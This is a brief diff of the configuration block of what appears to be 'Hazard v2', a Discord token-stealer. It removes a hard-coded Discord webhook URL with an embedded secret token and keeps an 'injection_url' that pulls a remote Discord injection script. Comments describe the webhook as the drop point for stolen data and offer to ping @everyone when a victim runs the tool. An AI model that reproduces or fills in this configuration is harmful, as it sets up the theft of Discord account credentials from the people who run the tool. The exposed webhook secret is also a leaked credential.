@@ -31,7 +31,7 @@ __config__ = {
 
 
     'webhook': "",  # Place your webhook here
-    "webhook": "https://discord.com/api/webhooks/1095634258514685962/C7obTNjg5HjK6Jag2xnJjPlDYeX-_YVdCREitNVO2zcPLL4408wXBtBeiTlT9PPXIKas",
+    "webhook": "",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
     # if True, it will ping @everyone when someone ran Hazard v2
